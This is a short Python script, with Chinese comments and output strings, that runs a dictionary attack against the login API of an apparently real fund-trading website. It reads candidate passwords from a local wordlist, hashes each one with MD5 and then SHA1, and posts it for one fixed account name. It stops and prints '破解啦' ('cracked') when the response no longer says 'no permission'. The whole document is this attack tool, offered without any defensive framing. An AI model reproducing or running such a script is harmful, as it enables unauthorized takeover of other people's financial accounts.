# _*_ coding: utf-8 _*_
import pandas as pd
import time
import requests
import re
from urllib import request
from http import cookiejar
import http.cookiejar
import urllib.request, urllib.parse, urllib.error
import http.cookiejar
import hashlib

fileobj = open('C:\\Users\\63220\\Desktop\\字典.txt','r')
try:
    strings = fileobj.read()
finally:
    fileobj.close()
x= strings.split('\n')
print(x)







def zypojie(mima):
    login_url = 'https://www.12345fund.com/html/login.html'
    post_URL = 'https://www.12345fund.com/api/v1/account/login_safe'
    get_url = 'https://www.12345fund.com/html/fundDetail.html?fundId=102015'  # 利用cookie请求訪问还有一个网址

    hash = hashlib.md5()
    mima1 = mima
    hash.update(mima1.encode('utf-8'))
    hs1 = hash.hexdigest()
    hash = hashlib.sha1()
    hash.update(hs1.encode('utf8'))
    passw = hash.hexdigest()
    # print(passw)
    values = {'account_name': "E00002199",
              'autologin':'1',
              'passwordmd5': passw}


    postdata = urllib.parse.urlencode(values).encode()
    user_agent = r'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'
    headers = {'User-Agent': user_agent}

    cookie_filename = 'cookie_jar.txt'
    cookie_jar = http.cookiejar.MozillaCookieJar(cookie_filename)
    handler = urllib.request.HTTPCookieProcessor(cookie_jar)
    opener = urllib.request.build_opener(handler)

    request = urllib.request.Request(login_url, headers=headers)
    try:
        print ('-------------')
        response = opener.open(request)
        request = urllib.request.Request(post_URL, data=postdata, headers=headers,method='POST')
        response = opener.open(request)
        print(response.read().decode())
        # ll=re.search('"token":"(.+?)"',response,re.DOTALL).group(1)
        # print(ll)
    except urllib.error.URLError as e:
        print(e.code, ':', e.reason)
    xxx=str(response.read().decode())
    yyy="没有权限"
    if yyy in xxx:
        coco="米有"
        return coco
    else:
        return mima


while len(x)>0:
    yy=x.pop(0)
    mima=zypojie(yy)
    if mima=="米有":
        print(yy)
        print("米有不对")
    else:
        print(yy)
        print("破解啦")
        break

print("down")







